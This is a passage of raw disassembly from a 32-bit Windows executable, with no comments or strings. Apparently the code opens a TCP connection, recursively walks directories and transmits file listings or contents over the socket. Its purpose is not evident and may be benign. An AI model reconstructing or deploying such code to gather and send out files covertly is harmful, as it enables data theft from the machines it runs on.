  4032e0:	38 5d 0b             	cmp    %bl,0xb(%ebp)
  4032e3:	74 21                	je     0x403306
  4032e5:	83 ec 10             	sub    $0x10,%esp
  4032e8:	8d 4d c0             	lea    -0x40(%ebp),%ecx
  4032eb:	8b c4                	mov    %esp,%eax
  4032ed:	68 1c d6 40 00       	push   $0x40d61c
  4032f2:	51                   	push   %ecx
  4032f3:	50                   	push   %eax
  4032f4:	e8 d1 93 00 00       	call   0x40c6ca
  4032f9:	83 c4 0c             	add    $0xc,%esp
  4032fc:	e8 fa ee ff ff       	call   0x4021fb
  403301:	83 c4 10             	add    $0x10,%esp
  403304:	eb 41                	jmp    0x403347
  403306:	83 ec 10             	sub    $0x10,%esp
  403309:	8d 85 30 fe ff ff    	lea    -0x1d0(%ebp),%eax
  40330f:	8b fc                	mov    %esp,%edi
  403311:	68 18 d6 40 00       	push   $0x40d618
  403316:	56                   	push   %esi
  403317:	68 00 d6 40 00       	push   $0x40d600
  40331c:	50                   	push   %eax
  40331d:	e8 a2 93 00 00       	call   0x40c6c4
  403322:	83 c4 0c             	add    $0xc,%esp
  403325:	50                   	push   %eax
  403326:	57                   	push   %edi
  403327:	e8 74 93 00 00       	call   0x40c6a0
  40332c:	83 c4 0c             	add    $0xc,%esp
  40332f:	b9 e8 16 41 00       	mov    $0x4116e8,%ecx
  403334:	6a 59                	push   $0x59
  403336:	e8 ef dd ff ff       	call   0x40112a
  40333b:	8d 8d 30 fe ff ff    	lea    -0x1d0(%ebp),%ecx
  403341:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  403347:	8d 4d c0             	lea    -0x40(%ebp),%ecx
  40334a:	ff 15 9c d2 40 00    	call   *0x40d29c
  403350:	8d 4d a0             	lea    -0x60(%ebp),%ecx
  403353:	ff 15 9c d2 40 00    	call   *0x40d29c
  403359:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40335c:	e9 dc 00 00 00       	jmp    0x40343d
  403361:	33 db                	xor    %ebx,%ebx
  403363:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  403366:	53                   	push   %ebx
  403367:	e8 f3 e7 ff ff       	call   0x401b5f
  40336c:	50                   	push   %eax
  40336d:	8d 45 f0             	lea    -0x10(%ebp),%eax
  403370:	50                   	push   %eax
  403371:	e8 84 7f 00 00       	call   0x40b2fa
  403376:	59                   	pop    %ecx
  403377:	59                   	pop    %ecx
  403378:	53                   	push   %ebx
  403379:	6a 01                	push   $0x1
  40337b:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  40337e:	e8 dc e7 ff ff       	call   0x401b5f
  403383:	50                   	push   %eax
  403384:	8d 85 f0 fd ff ff    	lea    -0x210(%ebp),%eax
  40338a:	50                   	push   %eax
  40338b:	e8 6a 7f 00 00       	call   0x40b2fa
  403390:	50                   	push   %eax
  403391:	8d 45 f0             	lea    -0x10(%ebp),%eax
  403394:	50                   	push   %eax
  403395:	8d 85 10 fe ff ff    	lea    -0x1f0(%ebp),%eax
  40339b:	50                   	push   %eax
  40339c:	e8 2f 93 00 00       	call   0x40c6d0
  4033a1:	83 c4 14             	add    $0x14,%esp
  4033a4:	8b c8                	mov    %eax,%ecx
  4033a6:	ff 15 98 d2 40 00    	call   *0x40d298
  4033ac:	50                   	push   %eax
  4033ad:	ff 15 4c d1 40 00    	call   *0x40d14c
  4033b3:	8d 8d 10 fe ff ff    	lea    -0x1f0(%ebp),%ecx
  4033b9:	ff 15 9c d2 40 00    	call   *0x40d29c
  4033bf:	8d 8d f0 fd ff ff    	lea    -0x210(%ebp),%ecx
  4033c5:	ff 15 9c d2 40 00    	call   *0x40d29c
  4033cb:	6a 2a                	push   $0x2a
  4033cd:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  4033d0:	ff 15 5c d2 40 00    	call   *0x40d25c
  4033d6:	83 ec 10             	sub    $0x10,%esp
  4033d9:	8d 45 f0             	lea    -0x10(%ebp),%eax
  4033dc:	8b cc                	mov    %esp,%ecx
  4033de:	50                   	push   %eax
  4033df:	ff 15 34 d2 40 00    	call   *0x40d234
  4033e5:	e8 11 ee ff ff       	call   0x4021fb
  4033ea:	83 c4 10             	add    $0x10,%esp
  4033ed:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  4033f0:	eb 4b                	jmp    0x40343d
  4033f2:	6a 00                	push   $0x0
  4033f4:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  4033f7:	e8 63 e7 ff ff       	call   0x401b5f
  4033fc:	8b c8                	mov    %eax,%ecx
  4033fe:	ff 15 c0 d2 40 00    	call   *0x40d2c0
  403404:	50                   	push   %eax
  403405:	ff 15 a4 d3 40 00    	call   *0x40d3a4
  40340b:	6a 01                	push   $0x1
  40340d:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  403410:	8b f0                	mov    %eax,%esi
  403412:	e8 48 e7 ff ff       	call   0x401b5f
  403417:	50                   	push   %eax
  403418:	8d 85 d0 fd ff ff    	lea    -0x230(%ebp),%eax
  40341e:	50                   	push   %eax
  40341f:	e8 d6 7e 00 00       	call   0x40b2fa
  403424:	59                   	pop    %ecx
  403425:	59                   	pop    %ecx
  403426:	8b c8                	mov    %eax,%ecx
  403428:	ff 15 98 d2 40 00    	call   *0x40d298
  40342e:	50                   	push   %eax
  40342f:	56                   	push   %esi
  403430:	e8 75 87 00 00       	call   0x40bbaa
  403435:	59                   	pop    %ecx
  403436:	59                   	pop    %ecx
  403437:	8d 8d d0 fd ff ff    	lea    -0x230(%ebp),%ecx
  40343d:	ff 15 9c d2 40 00    	call   *0x40d29c
  403443:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  403446:	e8 e5 e6 ff ff       	call   0x401b30
  40344b:	8d 4d 90             	lea    -0x70(%ebp),%ecx
  40344e:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  403454:	8d 4d b0             	lea    -0x50(%ebp),%ecx
  403457:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  40345d:	5f                   	pop    %edi
  40345e:	5e                   	pop    %esi
  40345f:	33 c0                	xor    %eax,%eax
  403461:	5b                   	pop    %ebx
  403462:	c9                   	leave
  403463:	c2 04 00             	ret    $0x4
  403466:	08 2b                	or     %ch,(%ebx)
  403468:	40                   	inc    %eax
  403469:	00 b3 2b 40 00 52    	add    %dh,0x5200402b(%ebx)
  40346f:	2c 40                	sub    $0x40,%al
  403471:	00 cb                	add    %cl,%bl
  403473:	2c 40                	sub    $0x40,%al
  403475:	00 28                	add    %ch,(%eax)
  403477:	2e 40                	cs inc %eax
  403479:	00 9e 30 40 00 4a    	add    %bl,0x4a004030(%esi)
  40347f:	32 40 00             	xor    0x0(%eax),%al
  403482:	61                   	popa
  403483:	33 40 00             	xor    0x0(%eax),%eax
  403486:	43                   	inc    %ebx
  403487:	34 40                	xor    $0x40,%al
  403489:	00 43 34             	add    %al,0x34(%ebx)
  40348c:	40                   	inc    %eax
  40348d:	00 f2                	add    %dh,%dl
  40348f:	33 40 00             	xor    0x0(%eax),%eax
  403492:	56                   	push   %esi
  403493:	8b f1                	mov    %ecx,%esi
  403495:	6a 00                	push   $0x0
  403497:	e8 dc db ff ff       	call   0x401078
  40349c:	8b c6                	mov    %esi,%eax
  40349e:	5e                   	pop    %esi
  40349f:	c3                   	ret
  4034a0:	e9 c6 dc ff ff       	jmp    0x40116b
  4034a5:	e8 05 00 00 00       	call   0x4034af
  4034aa:	e9 14 00 00 00       	jmp    0x4034c3
  4034af:	55                   	push   %ebp
  4034b0:	8b ec                	mov    %esp,%ebp
  4034b2:	51                   	push   %ecx
  4034b3:	8d 45 ff             	lea    -0x1(%ebp),%eax
  4034b6:	b9 30 17 41 00       	mov    $0x411730,%ecx
  4034bb:	50                   	push   %eax
  4034bc:	e8 d5 07 00 00       	call   0x403c96
  4034c1:	c9                   	leave
  4034c2:	c3                   	ret
  4034c3:	68 cf 34 40 00       	push   $0x4034cf
  4034c8:	e8 eb 8e 00 00       	call   0x40c3b8
  4034cd:	59                   	pop    %ecx
  4034ce:	c3                   	ret
  4034cf:	b9 30 17 41 00       	mov    $0x411730,%ecx
  4034d4:	e9 d8 07 00 00       	jmp    0x403cb1
  4034d9:	b8 5c c7 40 00       	mov    $0x40c75c,%eax
  4034de:	e8 5d 8f 00 00       	call   0x40c440
  4034e3:	81 ec 54 03 00 00    	sub    $0x354,%esp
  4034e9:	53                   	push   %ebx
  4034ea:	56                   	push   %esi
  4034eb:	57                   	push   %edi
  4034ec:	89 65 f0             	mov    %esp,-0x10(%ebp)
  4034ef:	8b f1                	mov    %ecx,%esi
  4034f1:	8d 85 64 fd ff ff    	lea    -0x29c(%ebp),%eax
  4034f7:	50                   	push   %eax
  4034f8:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  4034fb:	ff 15 dc d2 40 00    	call   *0x40d2dc
  403501:	83 0e ff             	orl    $0xffffffff,(%esi)
  403504:	33 ff                	xor    %edi,%edi
  403506:	89 7d fc             	mov    %edi,-0x4(%ebp)
  403509:	6a 06                	push   $0x6
  40350b:	6a 01                	push   $0x1
  40350d:	57                   	push   %edi
  40350e:	e8 d5 91 00 00       	call   0x40c6e8
  403513:	89 06                	mov    %eax,(%esi)
  403515:	6a 10                	push   $0x10
  403517:	68 78 11 41 00       	push   $0x411178
  40351c:	50                   	push   %eax
  40351d:	e8 d2 91 00 00       	call   0x40c6f4
  403522:	85 c0                	test   %eax,%eax
  403524:	0f 85 05 04 00 00    	jne    0x40392f
  40352a:	ff 36                	push   (%esi)
  40352c:	83 ec 10             	sub    $0x10,%esp
  40352f:	8b dc                	mov    %esp,%ebx
  403531:	8d 45 38             	lea    0x38(%ebp),%eax
  403534:	50                   	push   %eax
  403535:	bf 68 11 41 00       	mov    $0x411168,%edi
  40353a:	57                   	push   %edi
  40353b:	8d 45 28             	lea    0x28(%ebp),%eax
  40353e:	50                   	push   %eax
  40353f:	8d 85 4c fd ff ff    	lea    -0x2b4(%ebp),%eax
  403545:	50                   	push   %eax
  403546:	e8 6d 91 00 00       	call   0x40c6b8
  40354b:	83 c4 0c             	add    $0xc,%esp
  40354e:	50                   	push   %eax
  40354f:	53                   	push   %ebx
  403550:	e8 63 91 00 00       	call   0x40c6b8
  403555:	83 c4 0c             	add    $0xc,%esp
  403558:	6a 64                	push   $0x64
  40355a:	e8 42 df ff ff       	call   0x4014a1
  40355f:	83 c4 18             	add    $0x18,%esp
  403562:	8b d8                	mov    %eax,%ebx
  403564:	43                   	inc    %ebx
  403565:	f7 db                	neg    %ebx
  403567:	1b db                	sbb    %ebx,%ebx
  403569:	43                   	inc    %ebx
  40356a:	88 9d 60 fd ff ff    	mov    %bl,-0x2a0(%ebp)
  403570:	8d 8d 4c fd ff ff    	lea    -0x2b4(%ebp),%ecx
  403576:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  40357c:	84 db                	test   %bl,%bl
  40357e:	74 1b                	je     0x40359b
  403580:	c7 85 48 fd ff ff 01 	movl   $0x1,-0x2b8(%ebp)
  403587:	00 00 00 
  40358a:	68 28 e1 40 00       	push   $0x40e128
  40358f:	8d 85 48 fd ff ff    	lea    -0x2b8(%ebp),%eax
  403595:	50                   	push   %eax
  403596:	e8 51 8e 00 00       	call   0x40c3ec
  40359b:	ff 35 50 d3 40 00    	push   0x40d350
  4035a1:	8d 4d 18             	lea    0x18(%ebp),%ecx
  4035a4:	ff 15 24 d2 40 00    	call   *0x40d224
  4035aa:	50                   	push   %eax
  4035ab:	8d 4d 18             	lea    0x18(%ebp),%ecx
  4035ae:	ff 15 94 d2 40 00    	call   *0x40d294
  4035b4:	50                   	push   %eax
  4035b5:	8d 4d 18             	lea    0x18(%ebp),%ecx
  4035b8:	ff 15 24 d2 40 00    	call   *0x40d224
  4035be:	50                   	push   %eax
  4035bf:	e8 de 07 00 00       	call   0x403da2
  4035c4:	83 c4 10             	add    $0x10,%esp
  4035c7:	8d 85 8c fd ff ff    	lea    -0x274(%ebp),%eax
  4035cd:	50                   	push   %eax
  4035ce:	68 1c d6 40 00       	push   $0x40d61c
  4035d3:	8d 45 08             	lea    0x8(%ebp),%eax
  4035d6:	50                   	push   %eax
  4035d7:	8d 85 38 fd ff ff    	lea    -0x2c8(%ebp),%eax
  4035dd:	50                   	push   %eax
  4035de:	e8 e7 90 00 00       	call   0x40c6ca
  4035e3:	83 c4 0c             	add    $0xc,%esp
  4035e6:	8b c8                	mov    %eax,%ecx
  4035e8:	ff 15 98 d2 40 00    	call   *0x40d298
  4035ee:	50                   	push   %eax
  4035ef:	ff 15 68 d1 40 00    	call   *0x40d168
  4035f5:	89 45 ec             	mov    %eax,-0x14(%ebp)
  4035f8:	8d 8d 38 fd ff ff    	lea    -0x2c8(%ebp),%ecx
  4035fe:	ff 15 9c d2 40 00    	call   *0x40d29c
  403604:	83 7d ec ff          	cmpl   $0xffffffff,-0x14(%ebp)
  403608:	75 3e                	jne    0x403648
  40360a:	ff 36                	push   (%esi)
  40360c:	83 ec 10             	sub    $0x10,%esp
  40360f:	8b cc                	mov    %esp,%ecx
  403611:	8d 85 30 fd ff ff    	lea    -0x2d0(%ebp),%eax
  403617:	50                   	push   %eax
  403618:	68 a0 d4 40 00       	push   $0x40d4a0
  40361d:	ff 15 a4 d2 40 00    	call   *0x40d2a4
  403623:	6a 65                	push   $0x65
  403625:	e8 77 de ff ff       	call   0x4014a1
  40362a:	83 c4 18             	add    $0x18,%esp
  40362d:	c7 85 2c fd ff ff 02 	movl   $0x2,-0x2d4(%ebp)
  403634:	00 00 00 
  403637:	68 28 e1 40 00       	push   $0x40e128
  40363c:	8d 85 2c fd ff ff    	lea    -0x2d4(%ebp),%eax
  403642:	50                   	push   %eax
  403643:	e8 a4 8d 00 00       	call   0x40c3ec
  403648:	8d 85 8c fd ff ff    	lea    -0x274(%ebp),%eax
  40364e:	50                   	push   %eax
  40364f:	ff 75 ec             	push   -0x14(%ebp)
  403652:	ff 15 6c d1 40 00    	call   *0x40d16c
  403658:	85 c0                	test   %eax,%eax
  40365a:	0f 84 2d 02 00 00    	je     0x40388d
  403660:	f6 85 8c fd ff ff 10 	testb  $0x10,-0x274(%ebp)
  403667:	0f 84 e4 00 00 00    	je     0x403751
  40366d:	68 e4 d5 40 00       	push   $0x40d5e4
  403672:	8d 85 b8 fd ff ff    	lea    -0x248(%ebp),%eax
  403678:	50                   	push   %eax
  403679:	8b 1d 54 d3 40 00    	mov    0x40d354,%ebx
  40367f:	ff d3                	call   *%ebx
  403681:	59                   	pop    %ecx
  403682:	59                   	pop    %ecx
  403683:	85 c0                	test   %eax,%eax
  403685:	0f 84 c6 00 00 00    	je     0x403751
  40368b:	68 fc d6 40 00       	push   $0x40d6fc
  403690:	8d 85 b8 fd ff ff    	lea    -0x248(%ebp),%eax
  403696:	50                   	push   %eax
  403697:	ff d3                	call   *%ebx
  403699:	59                   	pop    %ecx
  40369a:	59                   	pop    %ecx
  40369b:	85 c0                	test   %eax,%eax
  40369d:	0f 84 ae 00 00 00    	je     0x403751
  4036a3:	68 f8 d6 40 00       	push   $0x40d6f8
  4036a8:	8d 85 18 fd ff ff    	lea    -0x2e8(%ebp),%eax
  4036ae:	50                   	push   %eax
  4036af:	8d 85 b8 fd ff ff    	lea    -0x248(%ebp),%eax
  4036b5:	50                   	push   %eax
  4036b6:	8d 8d 1c fd ff ff    	lea    -0x2e4(%ebp),%ecx
  4036bc:	ff 15 a0 d2 40 00    	call   *0x40d2a0
  4036c2:	50                   	push   %eax
  4036c3:	8d 45 08             	lea    0x8(%ebp),%eax
  4036c6:	50                   	push   %eax
  4036c7:	8d 85 08 fd ff ff    	lea    -0x2f8(%ebp),%eax
  4036cd:	50                   	push   %eax
  4036ce:	e8 fd 8f 00 00       	call   0x40c6d0
  4036d3:	83 c4 0c             	add    $0xc,%esp
  4036d6:	50                   	push   %eax
  4036d7:	8d 85 6c fd ff ff    	lea    -0x294(%ebp),%eax
  4036dd:	50                   	push   %eax
  4036de:	e8 e7 8f 00 00       	call   0x40c6ca
  4036e3:	83 c4 0c             	add    $0xc,%esp
  4036e6:	8d 8d 08 fd ff ff    	lea    -0x2f8(%ebp),%ecx
  4036ec:	ff 15 9c d2 40 00    	call   *0x40d29c
  4036f2:	8d 8d 1c fd ff ff    	lea    -0x2e4(%ebp),%ecx
  4036f8:	ff 15 9c d2 40 00    	call   *0x40d29c
  4036fe:	83 ec 10             	sub    $0x10,%esp
  403701:	8b cc                	mov    %esp,%ecx
  403703:	8d 45 18             	lea    0x18(%ebp),%eax
  403706:	50                   	push   %eax
  403707:	ff 15 34 d2 40 00    	call   *0x40d234
  40370d:	83 ec 10             	sub    $0x10,%esp
  403710:	8b cc                	mov    %esp,%ecx
  403712:	8d 85 6c fd ff ff    	lea    -0x294(%ebp),%eax
  403718:	50                   	push   %eax
  403719:	ff 15 34 d2 40 00    	call   *0x40d234
  40371f:	8b ce                	mov    %esi,%ecx
  403721:	e8 3f 02 00 00       	call   0x403965
  403726:	84 c0                	test   %al,%al
  403728:	75 1b                	jne    0x403745
  40372a:	c7 85 fc fc ff ff 03 	movl   $0x3,-0x304(%ebp)
  403731:	00 00 00 
  403734:	68 28 e1 40 00       	push   $0x40e128
  403739:	8d 85 fc fc ff ff    	lea    -0x304(%ebp),%eax
  40373f:	50                   	push   %eax
  403740:	e8 a7 8c 00 00       	call   0x40c3ec
  403745:	8d 8d 6c fd ff ff    	lea    -0x294(%ebp),%ecx
  40374b:	ff 15 9c d2 40 00    	call   *0x40d29c
  403751:	8d 85 f8 fc ff ff    	lea    -0x308(%ebp),%eax
  403757:	50                   	push   %eax
  403758:	8d 85 b8 fd ff ff    	lea    -0x248(%ebp),%eax
  40375e:	50                   	push   %eax
  40375f:	8d 8d 7c fd ff ff    	lea    -0x284(%ebp),%ecx
  403765:	ff 15 a0 d2 40 00    	call   *0x40d2a0
  40376b:	ff 35 50 d3 40 00    	push   0x40d350
  403771:	8d 8d 7c fd ff ff    	lea    -0x284(%ebp),%ecx
  403777:	ff 15 24 d2 40 00    	call   *0x40d224
  40377d:	50                   	push   %eax
  40377e:	8d 8d 7c fd ff ff    	lea    -0x284(%ebp),%ecx
  403784:	ff 15 94 d2 40 00    	call   *0x40d294
  40378a:	50                   	push   %eax
  40378b:	8d 8d 7c fd ff ff    	lea    -0x284(%ebp),%ecx
  403791:	ff 15 24 d2 40 00    	call   *0x40d224
  403797:	50                   	push   %eax
  403798:	e8 05 06 00 00       	call   0x403da2
  40379d:	83 c4 10             	add    $0x10,%esp
  4037a0:	6a 00                	push   $0x0
  4037a2:	8d 45 18             	lea    0x18(%ebp),%eax
  4037a5:	50                   	push   %eax
  4037a6:	8d 8d 7c fd ff ff    	lea    -0x284(%ebp),%ecx
  4037ac:	ff 15 28 d2 40 00    	call   *0x40d228
  4037b2:	8b 0d c8 d2 40 00    	mov    0x40d2c8,%ecx
  4037b8:	3b 01                	cmp    (%ecx),%eax
  4037ba:	0f 84 bc 00 00 00    	je     0x40387c
  4037c0:	8d 85 e4 fc ff ff    	lea    -0x31c(%ebp),%eax
  4037c6:	50                   	push   %eax
  4037c7:	68 50 02 00 00       	push   $0x250
  4037cc:	8d 85 8c fd ff ff    	lea    -0x274(%ebp),%eax
  4037d2:	50                   	push   %eax
  4037d3:	8d 8d e8 fc ff ff    	lea    -0x318(%ebp),%ecx
  4037d9:	ff 15 d0 d2 40 00    	call   *0x40d2d0
  4037df:	50                   	push   %eax
  4037e0:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  4037e3:	ff 15 d4 d2 40 00    	call   *0x40d2d4
  4037e9:	8d 8d e8 fc ff ff    	lea    -0x318(%ebp),%ecx
  4037ef:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  4037f5:	ff 36                	push   (%esi)
  4037f7:	83 ec 10             	sub    $0x10,%esp
  4037fa:	8b dc                	mov    %esp,%ebx
  4037fc:	8d 45 dc             	lea    -0x24(%ebp),%eax
  4037ff:	50                   	push   %eax
  403800:	57                   	push   %edi
  403801:	8d 45 08             	lea    0x8(%ebp),%eax
  403804:	50                   	push   %eax
  403805:	8d 85 cc fc ff ff    	lea    -0x334(%ebp),%eax
  40380b:	50                   	push   %eax
  40380c:	e8 bd 7a 00 00       	call   0x40b2ce
  403811:	59                   	pop    %ecx
  403812:	59                   	pop    %ecx
  403813:	50                   	push   %eax
  403814:	8d 85 bc fc ff ff    	lea    -0x344(%ebp),%eax
  40381a:	50                   	push   %eax
  40381b:	e8 98 8e 00 00       	call   0x40c6b8
  403820:	83 c4 0c             	add    $0xc,%esp
  403823:	50                   	push   %eax
  403824:	53                   	push   %ebx
  403825:	e8 8e 8e 00 00       	call   0x40c6b8
  40382a:	83 c4 0c             	add    $0xc,%esp
  40382d:	6a 66                	push   $0x66
  40382f:	e8 6d dc ff ff       	call   0x4014a1
  403834:	83 c4 18             	add    $0x18,%esp
  403837:	8b d8                	mov    %eax,%ebx
  403839:	43                   	inc    %ebx
  40383a:	f7 db                	neg    %ebx
  40383c:	1b db                	sbb    %ebx,%ebx
  40383e:	43                   	inc    %ebx
  40383f:	88 9d e0 fc ff ff    	mov    %bl,-0x320(%ebp)
  403845:	8d 8d bc fc ff ff    	lea    -0x344(%ebp),%ecx
  40384b:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  403851:	8d 8d cc fc ff ff    	lea    -0x334(%ebp),%ecx
  403857:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  40385d:	84 db                	test   %bl,%bl
  40385f:	74 1b                	je     0x40387c
  403861:	c7 85 b8 fc ff ff 04 	movl   $0x4,-0x348(%ebp)
  403868:	00 00 00 
  40386b:	68 28 e1 40 00       	push   $0x40e128
  403870:	8d 85 b8 fc ff ff    	lea    -0x348(%ebp),%eax
  403876:	50                   	push   %eax
  403877:	e8 70 8b 00 00       	call   0x40c3ec
  40387c:	8d 8d 7c fd ff ff    	lea    -0x284(%ebp),%ecx
  403882:	ff 15 9c d2 40 00    	call   *0x40d29c
  403888:	e9 bb fd ff ff       	jmp    0x403648
  40388d:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
  403891:	ff 75 ec             	push   -0x14(%ebp)
  403894:	ff 15 38 d1 40 00    	call   *0x40d138
  40389a:	ff 36                	push   (%esi)
  40389c:	83 ec 10             	sub    $0x10,%esp
  40389f:	8b f4                	mov    %esp,%esi
  4038a1:	8d 45 38             	lea    0x38(%ebp),%eax
  4038a4:	50                   	push   %eax
  4038a5:	57                   	push   %edi
  4038a6:	8d 45 28             	lea    0x28(%ebp),%eax
  4038a9:	50                   	push   %eax
  4038aa:	8d 85 a4 fc ff ff    	lea    -0x35c(%ebp),%eax
  4038b0:	50                   	push   %eax
  4038b1:	e8 02 8e 00 00       	call   0x40c6b8
  4038b6:	83 c4 0c             	add    $0xc,%esp
  4038b9:	50                   	push   %eax
  4038ba:	56                   	push   %esi
  4038bb:	e8 f8 8d 00 00       	call   0x40c6b8
  4038c0:	83 c4 0c             	add    $0xc,%esp
  4038c3:	6a 67                	push   $0x67
  4038c5:	e8 d7 db ff ff       	call   0x4014a1
  4038ca:	83 c4 18             	add    $0x18,%esp
  4038cd:	8d 8d a4 fc ff ff    	lea    -0x35c(%ebp),%ecx
  4038d3:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  4038d9:	8d 4d 28             	lea    0x28(%ebp),%ecx
  4038dc:	ff 15 c0 d2 40 00    	call   *0x40d2c0
  4038e2:	50                   	push   %eax
  4038e3:	ff 15 58 d3 40 00    	call   *0x40d358
  4038e9:	50                   	push   %eax
  4038ea:	e8 13 03 00 00       	call   0x403c02
  4038ef:	59                   	pop    %ecx
  4038f0:	59                   	pop    %ecx
  4038f1:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  4038f4:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  4038fa:	8d 4d 08             	lea    0x8(%ebp),%ecx
  4038fd:	ff 15 9c d2 40 00    	call   *0x40d29c
  403903:	8d 4d 18             	lea    0x18(%ebp),%ecx
  403906:	ff 15 9c d2 40 00    	call   *0x40d29c
  40390c:	8d 4d 28             	lea    0x28(%ebp),%ecx
  40390f:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  403915:	8d 4d 38             	lea    0x38(%ebp),%ecx
  403918:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  40391e:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  403921:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  403928:	5f                   	pop    %edi
  403929:	5e                   	pop    %esi
  40392a:	5b                   	pop    %ebx
  40392b:	c9                   	leave
  40392c:	c2 40 00             	ret    $0x40
  40392f:	57                   	push   %edi
  403930:	57                   	push   %edi
  403931:	e8 b6 8a 00 00       	call   0x40c3ec
  403936:	8d 4d 28             	lea    0x28(%ebp),%ecx
  403939:	ff 15 c0 d2 40 00    	call   *0x40d2c0
  40393f:	50                   	push   %eax
  403940:	ff 15 58 d3 40 00    	call   *0x40d358
  403946:	50                   	push   %eax
  403947:	e8 b6 02 00 00       	call   0x403c02
  40394c:	59                   	pop    %ecx
  40394d:	59                   	pop    %ecx
  40394e:	ff 75 ec             	push   -0x14(%ebp)
  403951:	ff 15 38 d1 40 00    	call   *0x40d138
  403957:	6a 00                	push   $0x0
  403959:	ff 15 3c d1 40 00    	call   *0x40d13c
  40395f:	b8 f1 38 40 00       	mov    $0x4038f1,%eax
  403964:	c3                   	ret
  403965:	55                   	push   %ebp
  403966:	8b ec                	mov    %esp,%ebp
  403968:	81 ec dc 02 00 00    	sub    $0x2dc,%esp
  40396e:	53                   	push   %ebx
  40396f:	56                   	push   %esi
  403970:	57                   	push   %edi
  403971:	8b f9                	mov    %ecx,%edi
  403973:	8d 45 ff             	lea    -0x1(%ebp),%eax
  403976:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  403979:	50                   	push   %eax
  40397a:	ff 15 dc d2 40 00    	call   *0x40d2dc
  403980:	8b 35 50 d3 40 00    	mov    0x40d350,%esi
  403986:	8d 4d 18             	lea    0x18(%ebp),%ecx
  403989:	56                   	push   %esi
  40398a:	ff 15 24 d2 40 00    	call   *0x40d224
  403990:	50                   	push   %eax
  403991:	8d 4d 18             	lea    0x18(%ebp),%ecx
  403994:	ff 15 94 d2 40 00    	call   *0x40d294
  40399a:	50                   	push   %eax
  40399b:	8d 4d 18             	lea    0x18(%ebp),%ecx
  40399e:	ff 15 24 d2 40 00    	call   *0x40d224
  4039a4:	50                   	push   %eax
  4039a5:	e8 f8 03 00 00       	call   0x403da2
  4039aa:	83 c4 10             	add    $0x10,%esp
  4039ad:	8d 85 24 fd ff ff    	lea    -0x2dc(%ebp),%eax
  4039b3:	50                   	push   %eax
  4039b4:	8d 45 08             	lea    0x8(%ebp),%eax
  4039b7:	68 1c d6 40 00       	push   $0x40d61c
  4039bc:	50                   	push   %eax
  4039bd:	8d 45 c4             	lea    -0x3c(%ebp),%eax
  4039c0:	50                   	push   %eax
  4039c1:	e8 04 8d 00 00       	call   0x40c6ca
  4039c6:	83 c4 0c             	add    $0xc,%esp
  4039c9:	8b c8                	mov    %eax,%ecx
  4039cb:	ff 15 98 d2 40 00    	call   *0x40d298
  4039d1:	50                   	push   %eax
  4039d2:	ff 15 68 d1 40 00    	call   *0x40d168
  4039d8:	8d 4d c4             	lea    -0x3c(%ebp),%ecx
  4039db:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4039de:	ff 15 9c d2 40 00    	call   *0x40d29c
  4039e4:	83 7d f8 ff          	cmpl   $0xffffffff,-0x8(%ebp)
  4039e8:	0f 84 f0 01 00 00    	je     0x403bde
  4039ee:	8d 85 24 fd ff ff    	lea    -0x2dc(%ebp),%eax
  4039f4:	50                   	push   %eax
  4039f5:	ff 75 f8             	push   -0x8(%ebp)
  4039f8:	ff 15 6c d1 40 00    	call   *0x40d16c
  4039fe:	85 c0                	test   %eax,%eax
  403a00:	0f 84 cf 01 00 00    	je     0x403bd5
  403a06:	f6 85 24 fd ff ff 10 	testb  $0x10,-0x2dc(%ebp)
  403a0d:	0f 84 ac 00 00 00    	je     0x403abf
  403a13:	8b 1d 54 d3 40 00    	mov    0x40d354,%ebx
  403a19:	8d 85 50 fd ff ff    	lea    -0x2b0(%ebp),%eax
  403a1f:	68 e4 d5 40 00       	push   $0x40d5e4
  403a24:	50                   	push   %eax
  403a25:	ff d3                	call   *%ebx
  403a27:	59                   	pop    %ecx
  403a28:	85 c0                	test   %eax,%eax
  403a2a:	59                   	pop    %ecx
  403a2b:	0f 84 8e 00 00 00    	je     0x403abf
  403a31:	8d 85 50 fd ff ff    	lea    -0x2b0(%ebp),%eax
  403a37:	68 fc d6 40 00       	push   $0x40d6fc
  403a3c:	50                   	push   %eax
  403a3d:	ff d3                	call   *%ebx
  403a3f:	59                   	pop    %ecx
  403a40:	85 c0                	test   %eax,%eax
  403a42:	59                   	pop    %ecx
  403a43:	74 7a                	je     0x403abf
  403a45:	8d 45 ff             	lea    -0x1(%ebp),%eax
  403a48:	6a 5c                	push   $0x5c
  403a4a:	50                   	push   %eax
  403a4b:	8d 85 50 fd ff ff    	lea    -0x2b0(%ebp),%eax
  403a51:	50                   	push   %eax
  403a52:	8d 4d 94             	lea    -0x6c(%ebp),%ecx
  403a55:	ff 15 a0 d2 40 00    	call   *0x40d2a0
  403a5b:	50                   	push   %eax
  403a5c:	8d 45 08             	lea    0x8(%ebp),%eax
  403a5f:	50                   	push   %eax
  403a60:	8d 85 74 ff ff ff    	lea    -0x8c(%ebp),%eax
  403a66:	50                   	push   %eax
  403a67:	e8 64 8c 00 00       	call   0x40c6d0
  403a6c:	83 c4 0c             	add    $0xc,%esp
  403a6f:	50                   	push   %eax
  403a70:	8d 45 c4             	lea    -0x3c(%ebp),%eax
  403a73:	50                   	push   %eax
